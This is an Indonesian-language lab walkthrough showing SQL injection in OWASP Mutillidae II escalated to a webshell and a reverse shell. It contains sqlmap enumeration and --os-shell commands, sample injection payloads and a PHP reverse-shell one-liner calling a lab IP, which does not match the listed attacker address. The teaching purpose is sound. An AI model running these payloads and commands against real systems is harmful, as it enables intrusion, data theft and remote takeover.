# SQLi: From Injection to Webshell and Reverse Shell

[🇬🇧 Read in English](sqli-webshell-reverse-shell-en.md)

# Apa itu SQL Injection?

**SQL Injection (SQLi)** adalah kerentanan keamanan siber di mana penyerang dapat menyisipkan atau memanipulasi query SQL berbahaya ke dalam input aplikasi. 

Hal ini terjadi karena aplikasi tidak melakukan validasi atau sanitasi yang memadai pada input pengguna sebelum menggabungkannya ke dalam query database. 

Jika berhasil dieksploitasi, penyerang dapat membaca, memodifikasi, atau menghapus data sensitif, bahkan dalam beberapa kasus, dapat mengambil alih kendali server secara keseluruhan.

# Jenis SQL Injection


<details>
<summary>Beberapa bentuk dan variasi SQL Injection yang umum antara lain:</summary>

1. In-band SQL Injection
2. Union-based SQLi
3. Error-based SQLi
4. Blind SQL Injection
5. Boolean-based Blind SQLi
6. Time-based Blind SQLi
7. Out-of-band (OOB) SQLi
8. Stacked Queries / Piggy-backed Queries
9. First-order SQLi
10. Second-order SQLi
11. GET-based SQLi
12. POST-based SQLi
13. Cookie-based SQLi
14. HTTP Header-based SQLi
15. User-Agent SQLi
16. Referer-based SQLi
17. JSON-based SQLi
18. XML-based SQLi
19. Authentication Bypass SQLi
20. Database-specific SQLi
21. Numeric SQL Injection
22. String-based SQL Injection
23. Arithmetic-based SQL Injection
24. ORDER BY SQL Injection
25. GROUP BY SQL Injection
26. HAVING SQL Injection
27. WHERE-clause SQL Injection
28. INSERT-based SQL Injection
29. UPDATE-based SQL Injection
30. DELETE-based SQL Injection
31. LIMIT/OFFSET SQL Injection
32. Subquery SQL Injection
33. Nested Query SQL Injection
34. Stored Procedure SQL Injection
35. Dynamic SQL Injection
36. ORM/Query Builder SQL Injection
37. GraphQL SQL Injection
38. Multipart/Form-data SQL Injection
39. Path Parameter SQL Injection
40. WebSocket SQL Injection
41. API Parameter SQL Injection
42. HTTP Parameter Pollution SQLi
43. Encoded SQL Injection
44. WAF-bypass SQL Injection
45. Comment-based SQL Injection
46. Case-manipulation SQL Injection
47. Whitespace-manipulation SQL Injection
</details>

---

# SQLi dan Dampaknya

Tidak semua SQL Injection dapat digunakan untuk menjalankan perintah pada sistem operasi. Kemampuan tersebut bergantung pada beberapa kondisi, seperti:

* DBMS yang digunakan
* Database account privilege
* Konfigurasi database
* Fitur atau fungsi DBMS yang tersedia
* Hak akses filesystem
* Hak akses user yang menjalankan service
* Konfigurasi web server dan application runtime

Dalam kondisi tertentu, SQLi dapat berkembang dari manipulasi query menjadi kemampuan berinteraksi dengan filesystem atau mekanisme eksekusi pada server. 

Pada demonstrasi ini, saya mencoba mengakses SQL injection lalu menempatkan dan menjalankan Webshell dan membuat pijakan Reverse Shell.

# Apa itu Webshell?

Webshell adalah file yang diunggah ke server (misalnya melalui celah SQL Injection) untuk memberikan akses kontrol jarak jauh ke sistem target.

# Apa itu Reverse Shell?

Reverse Shell adalah teknik di mana mesin target melakukan koneksi outbound ke mesin pentester untuk mendapatkan shell interaktif. Ini bukan jenis kerentanan, melainkan tahap lanjutan setelah SQLi berhasil memberikan kemampuan eksekusi perintah.

# Root Cause

Pada demonstrasi kali ini, SQL Injection menjadi titik masuk akibat kelemahan pada statement SQL. Eksploitasi kemudian dilanjutkan dengan penempatan Webshell sebagai foothold, yang selanjutnya digunakan untuk memperoleh Reverse Shell.


Alur pengujian:

```text
SQL Injection
      ↓
Manipulate SQL Query
      ↓
Interact with Database
      ↓
Write Webshell / Execute Command
      ↓
Webshell
      ↓
OS Command Execution
      ↓
Reverse Shell
      ↓
Outbound Connection
      ↓
Interactive Shell
```

# Topologi Lab

Pada demonstrasi ini saya menggunakan lingkungan lab sederhana berbasis VMware.

| Peran          | Keterangan                    | IP Address     |
| :------------- | :---------------------------- | :------------- |
| **Attacker**   | Kali Linux                    | `10.10.10.149` |
| **Target Web** | Ubuntu Server (Mutillidae II) | `10.10.10.2`   |

```text
┌──────────────────────────────────────────────┐
│              LAB — 10.10.10.0/24             │
│                                              │
│  ┌──────────────┐      ┌──────────────────┐  │
│  │ Kali Linux   │─────►│ Ubuntu Server    │  │
│  │ 10.10.10.149 │      │ 10.10.10.2       │  │
│  │ Listener:3001│◄─────│ Mutillidae II    │  │
│  └──────────────┘      │ SQLi → Web Shell │  │
│                        └────────┬─────────┘  │
│                                 │            │
│                                 └─ Reverse   │
│                                    Shell     │
└──────────────────────────────────────────────┘
```

# Demonstrasi

Di sini saya menggunakan Burp Suite untuk mencegat HTTP request, kemudian memasukkan karakter petik tunggal (`'`) ke dalam value `John` pada parameter `firstname`, sehingga menjadi `firstname=John'`.

![request-respone](request-respone.png)

Request tersebut menghasilkan respone `HTTP/1.1 500 Internal Server Error` dimana secara input validation belum memenuhi standar normal pada umumnya.

Untuk memvalidasi potensi SQL Injection, dilakukan pengujian kembali dengan input '--+- pada parameter firstname.

![request-respone-statment](request-respone1.png)

Input '--+- digunakan untuk memanipulasi statement SQL, di mana `'` digunakan untuk menutup string, sedangkan `--` digunakan untuk memulai komentar SQL. Karakter `+` digunakan sebagai representasi spasi pada URL-encoded form.

Secara umum peng-kodean untuk melakukan uji validasi:

| Kategori          | Representasi | Fungsi                                                      |
| ----------------- | ------------ | ----------------------------------------------------------- |
| **String**        | `'`          | Menutup string                                              |
| **String**        | `"`          | Delimiter string/identifier, tergantung DBMS                |
| **Comment**       | `--`         | Memulai komentar SQL                                        |
| **Comment**       | `#`          | Komentar SQL pada MySQL/MariaDB                             |
| **Comment**       | `/* */`      | Komentar blok SQL                                           |
| **Logika**        | `AND`        | Kondisi harus **TRUE + TRUE**                               |
| **Logika**        | `OR`         | Salah satu kondisi **TRUE**                                 |
| **Perbandingan**  | `=`          | Membandingkan nilai                                         |
| **Perbandingan**  | `<>`, `!=`   | Tidak sama dengan                                           |
| **Grouping**      | `()`         | Mengelompokkan ekspresi                                     |
| **URL Encoding**  | `%27`        | Representasi `'`                                            |
| **URL Encoding**  | `%22`        | Representasi `"`                                            |
| **URL Encoding**  | `%23`        | Representasi `#`                                            |
| **URL Encoding**  | `%2D%2D`     | Representasi `--`                                           |
| **URL Encoding**  | `%20`        | Representasi spasi                                          |
| **Form Encoding** | `+`          | Representasi spasi pada `application/x-www-form-urlencoded` |


Di sini pengintaian difokuskan untuk mengetahui **sejauh mana SQL Injection dapat memberikan akses terhadap sistem**, mulai dari database dan data yang tersedia hingga kemungkinan akses ke file dan sistem operasi.


Memuat request terlebih dahulu fokus ke request yang telah positif sql injection.

![sqlmap request](request.png)

Setelah itu dilanjutkan dengan testing akses.

Jalankan

![run tools](run-tools.png)

```bash
sqlmap -r owasp.hacking --dbs
```

Hasil Injectable automation.

![hasil inject](injectable.png)

Di gambar dan lists bawah ini adalah payload ciri khas sqlmap yang diujikan yang berfokus pada.

* **Boolean-based blind** → SQLi yang divalidasi dengan kondisi **benar/salah (TRUE/FALSE)** dan melihat perbedaan respons aplikasi.
* **Time-based blind** → SQLi yang divalidasi melalui **perbedaan waktu respons**, misalnya query dibuat delay `5` detik.
* **UNION-based** → SQLi yang memanfaatkan **`UNION SELECT`** untuk menggabungkan hasil query sehingga data dapat muncul pada respons aplikasi.


```bash
Parameter: firstname (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: firstname=John' AND 6904=6904-- wURt&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: firstname=John' AND (SELECT 2883 FROM (SELECT(!SLEEP(5)))KsnZ)-- Waej&submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: firstname=John' UNION ALL SELECT CONCAT(0x716a786271,0x4270724f4a6c65797a59775255656a4e485464776b51496d4c4372547559545662676950614a6858,0x71786b6a71)-- -&submit=Submit
```

Payload ini berhasil melakukan extraksi lists

![db lists](db-lists-success.png)

Selanjutnya, pengintaian difokuskan untuk mengetahui **sejauh mana akses yang diperoleh melalui SQL Injection**, mulai dari user dan privilege database hingga kemungkinan akses file, web, sistem operasi, dan koneksi OOB.

Target yang diperiksa:

* **User & Privilege** — akun, DBA, dan hak administrasi.
* **CRUD & Database** — operasi serta pengelolaan database.
* **File & Web** — akses filesystem, webroot, dan kemungkinan webshell.
* **Execution & OS** — eksekusi function, command, atau shell.
* **Access & OOB** — credentials, data sensitif, dan kemungkinan koneksi balik.

![lists info](run-info.png)

```bash
sqlmap -r owasp.hacking --current-user --users --privileges --is-dba
```

Perintah tersebut menghasilkan beberapa informasi penting yang dapat di kumpulkan untuk persiapan tahap selanjut-nya.

![lists info1](list-info1.png)

![lists info1](list-info2.png)

![lists info1](list-info3.png)

![lists info1](list-info4.png)

Seperti akses dba true, lalu database users sebagai bahan mapping database target (fokus kepada root merupakan akses tertinggi).

Dalam kondisi labs ini memiliki exposure sebagai user privilege biasa namun possible untuk melakukan create update delete serta upload file ke webshell.

Hal terpenting untuk eskalasi Webshell perlu menemukan lokasi folder upload yang terbuka.

![list directorylisting](listing.png)

Tergantung dari sisi lingkungan target memungkinkan menemukan lokasi secara langsung melalui, directory listing (default open), dan juga trace melalui titik akhir respone atau juga lokasi view source di browser.

Tujuan mengetahui ini adalah mengetahui pijakan webshell tersebut.

![etcpasswd](passwd.png)

Webshell sendiri bisa terakses jika ada stack server side yang bisa mengeksekusi kode server tersebut oleh attacker.

Disini saya melakukan pijakan selanjutnya dengan Reverse shell.

Cara webshell di sqlmap dengan melakukan:

![os-shell](os-shell.png)

```bash
sqlmap -r owasp.hacking --flush-session --skip-waf --os-shell
```

Lalu dilanjutkan dengan lokasi yang telah kita ketahui jika lokasi tersebut adalah lokasi file yang publik.

![os-shell-location](os-shell-location.png)

Disini kita membuat pijakan lagi untuk phpshell selanjutnya dengan memasukkan perintah code program.

![os-shell-success](os-shell-success.png)

Lalu testing apakah webshell dari os-shell dapat menginput command.

```
id
```
Setelah itu lanjut dengan membuat pijakan reverse shell.

```bash
php -r '$s=fsockopen("10.10.10.1",4002);proc_open("/bin/sh",[$s,$s,$s],$p);'
```

Disini lakukan input code open shell dengan syntak php menuju target yang ingin di spawn, lalu lanjutkan membuka nc diterminal.

![os-reverse-shell-success](os-reverse-shell-success.png)

Hasil nya adalah shell dari memanfaatkan SQL Injection - Up Webshell - Reverse shell sebagai pijakan akhir.

# Kesimpulan

Demonstrasi ini menunjukkan bagaimana SQL Injection dapat menjadi titik awal serangan yang berkembang hingga memperoleh akses ke sistem operasi. Proses dimulai dari validasi SQL Injection, dilanjutkan dengan enumerasi database dan privilege, kemudian pemanfaatan kemampuan akses filesystem untuk menempatkan Webshell, hingga memperoleh Reverse Shell.

Alur tersebut menunjukkan bahwa dampak SQL Injection tidak hanya terbatas pada manipulasi atau pengambilan data database. Dalam kondisi tertentu, kombinasi privilege database, konfigurasi DBMS, akses filesystem, dan konfigurasi aplikasi dapat memungkinkan eskalasi dari **SQL Injection → Webshell → OS Command Execution → Reverse Shell**.

Seluruh pengujian dilakukan pada lingkungan lab untuk memahami rantai eksploitasi dan batas akses yang dapat diperoleh dari SQL Injection.


# Referensi

* **OWASP – SQL Injection**
  [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection?utm_source=chatgpt.com)

* **OWASP – SQL Injection Prevention Cheat Sheet**
  [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com)

* **PortSwigger – SQL Injection**
  [PortSwigger Web Security Academy – SQL Injection](https://portswigger.net/web-security/sql-injection?utm_source=chatgpt.com)

* **sqlmap – Automatic SQL Injection and Database Takeover Tool**
  [sqlmap](https://sqlmap.org/?utm_source=chatgpt.com)

* **RevShells – Reverse Shell Generator**
  [RevShells](https://www.revshells.com/?utm_source=chatgpt.com)

* **OWASP Mutillidae II**
  [OWASP Mutillidae II](https://github.com/webpwnized/mutillidae?utm_source=chatgpt.com)

* **MITRE ATT&CK – Command and Scripting Interpreter**
  [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/?utm_source=chatgpt.com)

---

Terima kasih.
